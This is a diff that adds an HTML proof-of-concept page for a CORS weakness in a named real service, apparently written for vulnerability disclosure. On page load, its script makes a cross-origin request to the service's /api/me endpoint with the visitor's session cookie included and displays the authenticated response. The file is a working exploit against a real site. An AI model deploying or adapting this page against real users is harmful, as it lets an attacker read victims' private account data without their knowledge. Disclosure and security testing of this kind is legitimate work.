@@ -1,0 +1,39 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Sprinklr CORS PoC – CyberArk Connect</title>
+  <style>
+    body{font-family:system-ui, sans-serif;max-width:960px;margin:3rem auto;padding:0 1rem}
+    pre{white-space:pre-wrap;background:#f3f3f3;border:1px solid #ccc;padding:1rem}
+  </style>
+</head>
+<body>
+<h2>Sprinklr CyberArk Connect CORS Proof‑of‑Concept</h2>
+<p>If you are logged into <code>https://cyberarkconnect.sprinklr.com</code>
+in the same browser, the request below will include your <code>connect.sid</code>
+cookie and the API response will be displayed.</p>
+
+<p><strong>Status:</strong> <span id="status">loading…</span></p>
+<pre id="output"></pre>
+
+<script>
+(async () => {
+  try {
+    const res = await fetch(
+      "https://cyberarkconnect.sprinklr.com/api/me",
+      { credentials: "include", headers: { "Content-Type": "application/json" } }
+    );
+    document.getElementById("status").textContent = res.status;
+    const txt = await res.text();
+    // escape HTML chars to avoid XSS in the demo
+    const safe = txt.replace(/[<>&]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
+    document.getElementById("output").textContent = safe;
+  } catch (e) {
+    document.getElementById("status").textContent = "error";
+    document.getElementById("output").textContent = e.toString();
+  }
+})();
+</script>
+</body>
+</html>
